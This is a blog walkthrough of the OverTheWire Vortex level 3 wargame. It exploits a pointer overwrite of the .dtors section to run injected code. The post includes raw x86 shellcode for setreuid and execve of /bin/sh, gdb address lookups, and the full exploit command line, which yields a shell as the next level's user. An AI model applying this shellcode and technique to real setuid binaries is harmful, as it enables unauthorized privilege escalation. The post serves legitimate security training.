Title: overthewire, vortex: level 3
Date: 2011/10/11 02:01
Author: Ken Ko
Tags: nasm, shellcode, x86, stack, overthewire.org
Category: tutorials

Trying to make sense of what's going on with the code.

<code>
// val = 31337
31337 <-- val
// *lp = &val
[val] <- *lp || lp = 31337

// **lpp = &lp; *tmp
lp <- *lpp || [lp] <-- lpp || lp <-- *lpp
// tmp = *lpp
tmp = *lpp = [lp]
// **lpp = &buf
**lpp = &lp = &buf || [buf] <-- lpp || buf <-- *lpp
// *lpp = tmp
*lpp -> buf = tmp || buf = tmp
</code>

If that helps... at all. 

Anyhow, the plan should be to overwrite .dtor and make it point to our buf[] which will contain the shellcode of seteuid() and system(). Seems like a lot more than our previous tasks, so let's write a TODO list:

<code>
1. address of .dtor (should be easy)
2. address of 0x0804....h that points to .dtor
3. overflow lpp to be that address in [2]
4. write new shellcode to include that setuid()
5. place shellcode in buf[]
6. overwrite .dtor to point to middle of buf[]
</code>

We need a pointer to __DTOR_END__ because we can't use the address directly.

<code>
080482f4 <__do_global_dtors_aux>:
 . . .
 8048303:       a1 98 94 04 08          mov    0x8049498,%eax
 . . .
 8048313:       a3 98 94 04 08          mov    %eax,0x8049498
 . . .
 804831a:       a1 98 94 04 08          mov    0x8049498,%eax
 . . .
</code>

Taking a further look:

<code>
(gdb) x/20x 0x08049490
0x8049490 <data_start>: 0x00000000      0x00000000      0x08049578      0x00007a69
(gdb) x/x 0x08049498
0x8049498 <p.0>:   0x08049578
(gdb) x/x 0x08049578
0x8049578 <__DTOR_END__>:  0x00000000
</code>

Now the 71 bytes of shellcode to include both setreuid along with the execve:

<code>
"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xfa\x01\x66\xb9\xfa\x01\xcd\x80\xeb\x1e\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42" + "\xff" * 20 + "\x98\x94\x04\x08"'
</code>

Now, trial and error shows us that 140 bytes of trash is what we need to overwrite lpp. Trial and error which was done by noticing the exit codes (from gdb) and seeing that if we failed the address check, we would run into <strong>exit(2)</strong>. 

Here's the entire exploit:

<code>
vortex3@games ~ $ /vortex/level3 `python -c 'print "\x90" * 49 +  "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xfa\x01\x66\xb9\xfa\x01\xcd\x80\xeb\x1e\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42" + "\x90" * 20 + "\x98\x94\x04\x08"'`
sh-3.2$ whoami
vortex4
sh-3.2$
</code>

And here is the asm that generated the shellcode above:

[codebox 1]
